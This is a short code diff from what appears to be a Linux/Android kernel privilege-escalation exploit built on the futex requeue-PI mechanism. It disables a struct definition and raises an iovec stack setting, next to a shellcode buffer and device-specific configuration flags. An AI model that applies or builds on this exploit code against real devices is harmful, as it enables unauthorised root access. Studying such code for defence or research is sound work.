@@ -23,10 +23,12 @@
 #include <sys/mman.h>
 #include "log.h"
 
+#if 0
 struct mmsghdr {
     struct msghdr msg_hdr;
     unsigned int  msg_len;
 };
+#endif
 
 #ifndef FUTEX_WAIT_REQUEUE_PI
 #define FUTEX_WAIT_REQUEUE_PI   11
@@ -47,7 +49,7 @@ unsigned char shellcode_buf[2048] = { 0x90, 0x90, 0x90, 0x90 };
 unsigned char config_buf[2048] = { "c0nfig" };
 
 int config_new_samsung = 0;
-int config_iovstack = 2;
+int config_iovstack = 4;
 int config_offset = 0;
 int config_force_remove = 0;
 
